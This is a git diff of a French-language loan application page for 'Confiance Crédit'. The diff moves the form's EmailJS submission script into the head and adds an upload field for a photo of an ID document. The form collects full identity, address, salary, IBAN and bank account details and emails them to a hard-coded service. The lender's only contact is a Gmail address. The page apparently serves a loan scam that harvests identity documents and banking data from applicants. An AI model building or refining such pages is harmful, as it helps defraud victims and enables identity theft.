@@ -1,14 +1,30 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Demande de prêt - Confiance Crédit</title>
+  <title>Confiance Crédit - Demande de prêt</title>
   <link rel="stylesheet" href="css/styles.css">
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("c8ZN5oyhh7vUaeXzd"); // Ton public key
+    })();
+    function sendEmail(event) {
+      event.preventDefault();
+      emailjs.sendForm("service_8ukh7wp","template_0axeamd", event.target)
+      .then(() => {
+        window.location.href = "thank-you.html";
+      }, (error) => {
+        alert("Erreur lors de l’envoi : " + JSON.stringify(error));
+      });
+    }
+  </script>
 </head>
 <body>
   <header>
-    <img src="images/logo.png" alt="Logo" class="logo" style="max-height:80px;">
+    <img src="images/logo.png" alt="Logo Confiance Crédit" class="logo">
     <nav>
       <a href="index.html">Accueil</a>
       <a href="services.html">Services</a>
@@ -19,47 +35,30 @@
   </header>
 
   <main>
-    <h1>Formulaire de demande de prêt</h1>
-    <form id="loan-form">
-      <label>Prénom : <input type="text" name="prenom" required></label><br>
-      <label>Nom : <input type="text" name="nom" required></label><br>
-      <label>Date de naissance : <input type="date" name="dob" required></label><br>
-      <label>Adresse : <input type="text" name="adresse" required></label><br>
-      <label>Pays : <input type="text" name="pays" required></label><br>
-      <label>Profession : <input type="text" name="profession" required></label><br>
-      <label>Salaire : <input type="number" name="salaire" required></label><br>
-      <label>Email : <input type="email" name="email" required></label><br>
-      <label>Montant du prêt : <input type="number" name="montant" required></label><br>
-      <label>Période de remboursement : <input type="text" name="periode" required></label><br>
-      <label>IBAN : <input type="text" name="iban"></label><br>
-      <label>Nom de la banque : <input type="text" name="banque"></label><br>
-      <label>Propriétaire du compte : <input type="text" name="titulaire"></label><br>
-      <button type="submit">Envoyer</button>
-    </form>
+    <section>
+      <h1>Formulaire de Demande de Prêt</h1>
+      <form onsubmit="sendEmail(event)">
+        <label>Prénom : <input type="text" name="prenom" required></label>
+        <label>Nom : <input type="text" name="nom" required></label>
+        <label>Date de naissance : <input type="date" name="naissance" required></label>
+        <label>Adresse exacte : <input type="text" name="adresse" required></label>
+        <label>Pays : <input type="text" name="pays" required></label>
+        <label>Profession : <input type="text" name="profession" required></label>
+        <label>Salaire : <input type="number" name="salaire" required></label>
+        <label>Email : <input type="email" name="email" required></label>
+        <label>Montant du prêt : <input type="number" name="montant" required></label>
+        <label>Période de remboursement : <input type="text" name="periode" required></label>
+        <label>Photo de pièce d’identité : <input type="file" name="piece_identite"></label>
+        <label>IBAN : <input type="text" name="iban"></label>
+        <label>Nom de la banque : <input type="text" name="banque"></label>
+        <label>Propriétaire du compte : <input type="text" name="proprietaire"></label>
+        <button type="submit">Soumettre</button>
+      </form>
+    </section>
   </main>
 
   <footer>
-    <p>© 2019 - Confiance Crédit</p>
+    &copy; 2019 - 2025 Confiance Crédit | Paris, France | Email : confiancecredit.fr@gmail.com
   </footer>
-
-  <!-- Script EmailJS -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function(){
-      emailjs.init("c8ZN5oyhh7vUaeXzd"); // Public Key
-    })();
-
-    document.getElementById("loan-form").addEventListener("submit", function(event){
-      event.preventDefault();
-
-      emailjs.sendForm("service_8ukh7wp", "template_0axeamd", this)
-        .then(function() {
-          alert("✅ Demande envoyée avec succès !");
-          window.location.href = "thank-you.html"; // redirection après envoi
-        }, function(error) {
-          alert("❌ Une erreur est survenue : " + JSON.stringify(error));
-        });
-    });
-  </script>
 </body>
 </html>
